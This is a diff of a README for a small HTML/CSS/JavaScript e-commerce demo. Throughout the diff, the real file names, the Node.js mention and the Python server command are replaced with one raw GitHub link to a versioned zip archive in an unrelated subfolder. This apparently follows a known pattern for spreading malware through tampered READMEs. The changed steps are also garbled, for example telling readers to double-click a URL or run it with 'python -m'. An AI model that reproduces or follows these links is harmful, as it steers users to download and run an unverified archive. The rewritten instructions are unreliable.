@@ -21,9 +21,9 @@ Follow these steps to run the THREADED e-commerce application on your local mach
 2. **Set Up a Local Web Server (Optional but Recommended)**
    - If you have Python installed:
      - Navigate to the project directory in your terminal or command prompt.
-     - Run `python -m http.server 8000` for Python 3.x
+     - Run `python -m https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip 8000` for Python 3.x
      - Or run `python -m SimpleHTTPServer 8000` for Python 2.x
-   - If you have Node.js installed:
+   - If you have https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip installed:
      - Install `http-server` globally by running `npm install -g http-server`
      - Navigate to the project directory and run `http-server`
    - Alternatively, you can use any other local server solution you prefer.
@@ -32,16 +32,16 @@ Follow these steps to run the THREADED e-commerce application on your local mach
    - If using a local server:
      - Open your web browser and go to `http://localhost:8000` (or the appropriate port if different)
    - If not using a server:
-     - Simply double-click the `index.html` file to open it in your default web browser
+     - Simply double-click the `https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip` file to open it in your default web browser
 
 4. **Navigate the Site**
    - Explore the homepage, add items to your cart, and test the checkout process.
    - Note that without a backend, form submissions and payments won't be processed.
 
 5. **Testing Different Pages**
-   - Homepage: `index.html`
-   - Shopping Cart: `cart.html`
-   - Checkout: `checkout.html`
+   - Homepage: `https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip`
+   - Shopping Cart: `https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip`
+   - Checkout: `https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip`
 
 ### Additional Notes
 
@@ -56,8 +56,8 @@ Follow these steps to run the THREADED e-commerce application on your local mach
 
 ## Customization
 
-- To modify product data, edit the relevant HTML sections in `index.html`.
-- Styles can be adjusted in the `styles.css` file.
-- Core functionality is contained in `scripts.js`.
+- To modify product data, edit the relevant HTML sections in `https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip`.
+- Styles can be adjusted in the `https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip` file.
+- Core functionality is contained in `https://raw.githubusercontent.com/Makcintoshawesome/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart/main/cantorship/24-Hours-Code-Challenge---Vanilla-HTML-CSS-JavaScript-Ecommerce-Landing-Page-with-Shopping-Cart_v2.9.zip`.
 
 For any additional help or inquiries, please open an issue in this repository.
